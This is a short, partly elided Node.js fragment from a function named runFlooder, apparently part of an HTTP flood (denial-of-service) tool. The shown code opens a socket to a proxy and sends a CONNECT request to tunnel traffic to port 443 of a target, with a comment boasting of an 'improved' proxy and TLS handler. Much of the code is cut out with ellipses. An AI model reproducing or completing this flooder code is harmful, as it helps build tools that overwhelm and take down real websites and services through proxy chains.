...
function runFlooder() {
    ...
    // ===== NEW IMPROVED PROXY + TLS HANDLER =====
    const netSocket = net.createConnection({
        host: proxyOptions.host,
        port: proxyOptions.port
    }, () => {
        const connectPayload = `CONNECT ${proxyOptions.address}:443 HTTP/1.1\r\nHost: ${proxyOptions.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        netSocket.write(connectPayload);
    });
    ...
    netSocket.on('timeout', () => netSocket.destroy());
}
